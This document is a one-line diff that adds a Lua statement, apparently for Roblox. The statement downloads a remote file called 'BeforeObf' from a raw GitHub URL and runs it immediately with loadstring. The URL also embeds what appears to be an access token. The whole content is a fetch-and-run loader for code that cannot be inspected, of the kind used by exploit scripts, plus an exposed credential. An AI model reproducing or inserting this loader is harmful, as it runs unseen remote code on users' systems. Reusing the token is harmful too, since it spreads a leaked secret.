@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tinyunix1/b4obf/main/BeforeObf?token=GHSAT0AAAAAACEFJWEF2BWPX7FJEPVG3JWCZE2KJJQ"))()
